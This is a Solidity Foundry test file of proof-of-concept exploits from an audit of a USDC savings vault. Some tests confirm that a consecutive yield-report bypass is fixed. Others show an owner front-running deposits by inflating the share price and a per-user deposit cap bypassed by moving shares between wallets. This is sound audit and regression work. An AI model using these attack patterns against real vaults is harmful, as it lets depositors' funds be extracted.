// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

import {Test, console2} from "forge-std/Test.sol";
import {USDCSavingsVault} from "../src/USDCSavingsVault.sol";
import {VaultShare} from "../src/VaultShare.sol";
import {StrategyOracle} from "../src/StrategyOracle.sol";
import {RoleManager} from "../src/RoleManager.sol";
import {MockUSDC} from "./mocks/MockUSDC.sol";

/**
 * @title CriticalExploitPoC
 * @notice Proof of Concept demonstrating CRITICAL vulnerabilities found in independent audit
 * @dev These tests PASS to demonstrate the exploits work
 *
 * FINDINGS DEMONSTRATED:
 * - C-1: Yield Bounds Bypass via Consecutive Reports
 * - H-1: Owner Front-Running Attack
 * - M-2: Per-User Cap Bypass
 */
contract CriticalExploitPoC is Test {
    USDCSavingsVault public vault;
    VaultShare public shares;
    StrategyOracle public strategyOracle;
    RoleManager public roleManager;
    MockUSDC public usdc;

    address public owner = address(this);
    address public multisig = makeAddr("multisig");
    address public treasury = makeAddr("treasury");
    address public operator = makeAddr("operator");

    address public attacker = makeAddr("attacker");
    address public victim = makeAddr("victim");

    uint256 public constant FEE_RATE = 0.2e18;
    uint256 public constant COOLDOWN = 1 days;

    function setUp() public {
        usdc = new MockUSDC();
        roleManager = new RoleManager(owner);
        strategyOracle = new StrategyOracle(address(roleManager));

        vault = new USDCSavingsVault(
            address(usdc),
            address(strategyOracle),
            address(roleManager),
            multisig,
            treasury,
            FEE_RATE,
            COOLDOWN,
            "USDC Savings Vault Share",
            "svUSDC"
        );
        shares = vault.shares();
        roleManager.setOperator(operator, true);
        strategyOracle.setVault(address(vault));

        // Keep funds in vault for testing
        vault.setWithdrawalBuffer(type(uint256).max);

        // Fund users
        usdc.mint(attacker, 10_000_000e6);
        usdc.mint(victim, 10_000_000e6);
        usdc.mint(multisig, 100_000_000e6);

        vm.prank(attacker);
        usdc.approve(address(vault), type(uint256).max);
        vm.prank(victim);
        usdc.approve(address(vault), type(uint256).max);
        vm.prank(multisig);
        usdc.approve(address(vault), type(uint256).max);
    }

    // ============================================================
    // C-1: CRITICAL - Yield Bounds Bypass via Consecutive Reports
    // STATUS: FIXED - MIN_REPORT_INTERVAL now prevents consecutive reports
    // ============================================================

    /**
     * @notice Verifies that consecutive yield reports are now BLOCKED
     * @dev The C-1 vulnerability has been fixed with MIN_REPORT_INTERVAL = 1 day
     */
    function test_C1_YieldBoundsCompoundBypass_FIXED() public {
        console2.log("=== C-1: YIELD BOUNDS BYPASS - VERIFIED FIXED ===");
        console2.log("");

        // Victim deposits 1M USDC
        vm.prank(victim);
        vault.deposit(1_000_000e6);

        uint256 navBefore = vault.totalAssets();
        uint256 priceBefore = vault.sharePrice();

        console2.log("Initial state:");
        console2.log("  NAV:", navBefore / 1e6, "USDC");
        console2.log("  Share price:", priceBefore);
        console2.log("");

        // First report succeeds
        uint256 currentNav = vault.totalAssets();
        int256 firstYield = int256((currentNav * 10) / 100); // 10% of current NAV
        strategyOracle.reportYield(firstYield);

        console2.log("First yield report succeeded");

        // Second consecutive report should FAIL with ReportTooSoon
        currentNav = vault.totalAssets();
        int256 secondYield = int256((currentNav * 10) / 100);
        vm.expectRevert(StrategyOracle.ReportTooSoon.selector);
        strategyOracle.reportYield(secondYield);

        console2.log("Second consecutive report BLOCKED - ReportTooSoon");
        console2.log("");
        console2.log("C-1 VULNERABILITY FIXED!");
        console2.log("MIN_REPORT_INTERVAL (1 day) prevents compounding bypass");
    }

    /**
     * @notice Verifies that consecutive yield manipulation is now BLOCKED
     * @dev The C-1 vulnerability (drain new depositors) is fixed with MIN_REPORT_INTERVAL
     */
    function test_C1_OwnerDrainsNewDepositors_FIXED() public {
        console2.log("=== C-1 VARIANT: OWNER DRAINS NEW DEPOSITORS - VERIFIED FIXED ===");
        console2.log("");

        // Initial depositor
        vm.prank(victim);
        vault.deposit(1_000_000e6);

        // First yield report succeeds
        uint256 nav = vault.totalAssets();
        strategyOracle.reportYield(int256(nav / 10));
        console2.log("First yield report succeeded");

        // Second consecutive report should FAIL
        nav = vault.totalAssets();
        vm.expectRevert(StrategyOracle.ReportTooSoon.selector);
        strategyOracle.reportYield(int256(nav / 10));

        console2.log("Second report BLOCKED - attack cannot proceed");
        console2.log("");
        console2.log("C-1 DRAIN ATTACK FIXED!");
        console2.log("Owner cannot manipulate NAV rapidly to drain depositors");
    }

    // ============================================================
    // H-1: HIGH - Owner Front-Running Attack
    // ============================================================

    /**
     * @notice Demonstrates owner can front-run deposits to extract value
     */
    function test_H1_OwnerFrontRunsDeposits() public {
        console2.log("=== H-1: OWNER FRONT-RUNNING EXPLOIT ===");
        console2.log("");

        // Initial deposit to establish shares
        vm.prank(victim);
        vault.deposit(1_000_000e6);

        uint256 priceBefore = vault.sharePrice();
        console2.log("Price before victim2 deposit:", priceBefore);

        // Simulate: Owner sees victim2's 100k deposit in mempool
        address victim2 = makeAddr("victim2");
        usdc.mint(victim2, 100_000e6);

        // Owner front-runs with yield report (inflates price)
        strategyOracle.reportYield(100_000e6); // 10% yield

        uint256 priceAfterFrontrun = vault.sharePrice();
        console2.log("Price after owner front-run:", priceAfterFrontrun);

        // Victim2's deposit executes at inflated price
        vm.startPrank(victim2);
        usdc.approve(address(vault), type(uint256).max);
        uint256 victim2Shares = vault.deposit(100_000e6);
        vm.stopPrank();

        // Compare to fair shares they should have received
        uint256 fairShares = (100_000e6 * 1e18) / priceBefore;

        console2.log("Victim2 shares received:", victim2Shares);
        console2.log("Fair shares (no frontrun):", fairShares);
        console2.log("Shares lost to frontrun:", fairShares - victim2Shares);

        // Value extracted
        uint256 valueLost = vault.sharesToUsdc(fairShares - victim2Shares);
        console2.log("Value extracted by owner:", valueLost / 1e6, "USDC");

        assertLt(victim2Shares, fairShares, "Victim should receive fewer shares due to frontrun");
    }

    // ============================================================
    // M-2: MEDIUM - Per-User Cap Bypass
    // ============================================================

    /**
     * @notice Demonstrates per-user cap can be bypassed via share transfer
     * @dev This is a known design tradeoff - caps are based on current holdings, not cumulative
     */
    function test_M2_PerUserCapBypass() public {
        console2.log("=== M-2: PER-USER CAP BYPASS ===");
        console2.log("");

        // Set 100k per-user cap
        vault.setPerUserCap(100_000e6);
        console2.log("Per-user cap set to: 100,000 USDC");

        // Attacker deposits to cap
        vm.startPrank(attacker);
        uint256 attackerShares = vault.deposit(100_000e6);
        console2.log("Attacker deposited 100k (at cap), got shares:", attackerShares);
        assertGt(attackerShares, 0, "Attacker should have received shares");

        // Verify attacker is at cap
        vm.expectRevert(USDCSavingsVault.ExceedsUserCap.selector);
        vault.deposit(1e6);
        console2.log("Attacker blocked from additional deposit (expected)");

        // BYPASS: Transfer shares to second wallet
        address attackerWallet2 = makeAddr("attackerWallet2");
        uint256 sharesToTransfer = shares.balanceOf(attacker);
        console2.log("Attacker balance before transfer:", sharesToTransfer);

        shares.transfer(attackerWallet2, sharesToTransfer);
        console2.log("Attacker transferred all shares to wallet2");

        // Now attacker can deposit again!
        vault.deposit(100_000e6);
        console2.log("Attacker deposited ANOTHER 100k (bypassed cap!)");
        vm.stopPrank();

        // Transfer back
        uint256 wallet2Balance = shares.balanceOf(attackerWallet2);
        vm.prank(attackerWallet2);
        shares.transfer(attacker, wallet2Balance);

        // Total holdings
        uint256 attackerTotalValue = vault.sharesToUsdc(shares.balanceOf(attacker));
        console2.log("Attacker total position:", attackerTotalValue / 1e6, "USDC");

        assertGt(attackerTotalValue, 190_000e6, "Attacker should have >190k despite 100k cap");
        console2.log("");
        console2.log("EXPLOIT SUCCESSFUL: 100k cap bypassed, attacker has 200k position");
    }

    // ============================================================
    // BONUS: Combined Attack Scenario
    // STATUS: FIXED - Consecutive reports now blocked
    // ============================================================

    /**
     * @notice Verifies that combined attack scenario is now BLOCKED
     * @dev The C-1 fix prevents consecutive yield reports needed for this attack
     */
    function test_COMBINED_FullAttackScenario_FIXED() public {
        console2.log("=== COMBINED ATTACK SCENARIO - VERIFIED FIXED ===");
        console2.log("");

        // Phase 1: Victim deposits
        vm.prank(victim);
        vault.deposit(1_000_000e6);
        console2.log("Phase 1: Victim deposits 1M USDC");

        // Phase 2: First yield report succeeds
        strategyOracle.reportYield(-90_000e6);
        console2.log("Phase 2: First yield report succeeded (deflation)");

        // Owner deposits at deflated price
        usdc.mint(owner, 100_000e6);
        usdc.approve(address(vault), type(uint256).max);
        uint256 ownerShares = vault.deposit(100_000e6);
        console2.log("  Owner deposited 100k at deflated price");
        console2.log("  Owner received shares:", ownerShares);

        // Phase 3: Try to inflate - BLOCKED
        console2.log("Phase 3: Attempting inflation...");
        uint256 nav = vault.totalAssets();
        vm.expectRevert(StrategyOracle.ReportTooSoon.selector);
        strategyOracle.reportYield(int256(nav / 10));

        console2.log("Second report BLOCKED - attack cannot complete!");
        console2.log("");
        console2.log("COMBINED ATTACK FIXED!");
        console2.log("MIN_REPORT_INTERVAL prevents rapid NAV manipulation");
    }
}
